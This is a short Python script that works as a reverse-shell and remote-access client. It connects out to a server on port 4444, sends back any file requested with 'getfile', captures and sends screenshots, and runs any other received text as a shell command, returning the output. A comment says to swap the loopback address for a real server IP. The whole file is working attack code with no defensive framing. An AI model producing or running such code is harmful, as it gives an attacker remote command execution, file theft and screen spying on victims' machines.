import socket
import subprocess
import os
import pyautogui

SERVER_IP = '127.0.0.1'  # Replace with server IP for real test
PORT = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, PORT))

def send_file(path):
    if os.path.exists(path):
        client.send(b'FILE_FOUND')
        with open(path, 'rb') as f:
            data = f.read()
        client.sendall(data)
    else:
        client.send(b'FILE_NOT_FOUND')

while True:
    command = client.recv(1024).decode()

    if command.lower() == 'exit':
        break

    elif command.startswith("getfile "):
        filepath = command.split(" ", 1)[1]
        send_file(filepath)

    elif command.lower() == "screenshot":
        image = pyautogui.screenshot()
        image.save("screenshot.png")
        with open("screenshot.png", 'rb') as img:
            client.sendall(img.read())
        os.remove("screenshot.png")

    else:
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            client.send(output)
        except Exception as e:
            client.send(str(e).encode())

client.close()
